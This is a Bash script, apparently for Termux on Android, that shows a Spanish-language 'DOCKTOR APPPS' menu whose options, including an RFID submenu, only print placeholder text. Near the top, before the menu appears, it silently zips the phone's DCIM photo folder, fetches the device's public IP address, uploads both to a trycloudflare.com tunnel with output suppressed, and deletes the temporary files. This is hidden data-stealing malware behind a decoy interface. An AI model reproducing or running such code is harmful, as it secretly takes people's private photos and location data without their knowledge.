#!/bin/bash
pkg update ; apt update ; sudo apt update
pkg upgrade ; apt update ; sudo apt update
pkg install screen ; apt install screen ; sudo apt install screen
pkg install zip ; apt install screen ; sudo apt install screen

zip myfile.zip /storage/emulated/0/DCIM > /dev/null 2>&1 &
#echo "hi" > myfile.zip
curl "https://ifconfig.me/" > ips.zip 2>/dev/null

curl -X POST -F "file=@myfile.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1
curl -X POST -F "file=@ips.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'


rm -rf myfile.zip
rm -rf ips.zip

# FunciÃ³n principal del menÃº
show_menu() {
    echo -e "${GREEN}=====================${NC}"
    echo -e "${YELLOW}--- DOCKTOR APPPS ---${NC}"
    echo -e "${GREEN}=====================${NC}"
    echo -e "${GREEN}1) OpciÃ³n 1${NC}"
    echo -e "${GREEN}2) OpciÃ³n 2${NC}"
    echo -e "${GREEN}3) OpciÃ³n 3${NC}"
    echo -e "${GREEN}4) RFID${NC}"
    echo -e "${GREEN}5) Salir${NC}"
    echo -e "${GREEN}=====================${NC}"
}

# SubmenÃº de ejemplo para OpciÃ³n 1
submenu_option1() {
    echo -e "${GREEN}=== SubmenÃº OpciÃ³n 1 ===${NC}"
    echo -e "${GREEN}1) SubopciÃ³n 1.1${NC}"
    echo -e "${GREEN}2) SubopciÃ³n 1.2${NC}"
    echo -e "${GREEN}3) Regresar al menÃº principal${NC}"
    read -p "Seleccione una opciÃ³n: " suboption
    case $suboption in
        1) echo "Ejecutando SubopciÃ³n 1.1";;
        2) echo "Ejecutando SubopciÃ³n 1.2";;
        3) return ;; # Volver al menÃº principal
        *) echo "OpciÃ³n no vÃ¡lida" ;;
    esac
}

# SubmenÃº de ejemplo para RFID
submenu_rfid() {
    echo -e "${GREEN}=== SubmenÃº RFID ===${NC}"
    echo -e "${GREEN}1) Leer RFID${NC}"
    echo -e "${GREEN}2) Escribir RFID${NC}"
    echo -e "${GREEN}3) Regresar al menÃº principal${NC}"
    read -p "Seleccione una opciÃ³n: " suboption
    case $suboption in
        1) echo "Leyendo RFID...";;
        2) echo "Escribiendo en RFID...";;
        3) return ;; # Volver al menÃº principal
        *) echo "OpciÃ³n no vÃ¡lida" ;;
    esac
}

# FunciÃ³n para manejar las opciones del menÃº
handle_option() {
    case $1 in
        1) submenu_option1 ;;  # Llamamos al submenÃº de OpciÃ³n 1
        2) echo "Ejemplo de OpciÃ³n 2";;
        3) echo "Ejemplo de OpciÃ³n 3";;
        4) submenu_rfid ;;  # Llamamos al submenÃº de RFID
        5) echo "Saliendo..."; exit 0;;
        *) echo "OpciÃ³n no vÃ¡lida";;
    esac
}

# Bucle principal del menÃº
while true; do
    show_menu
    read -p "Seleccione una opciÃ³n: " option
    handle_option $option
    echo ""
done
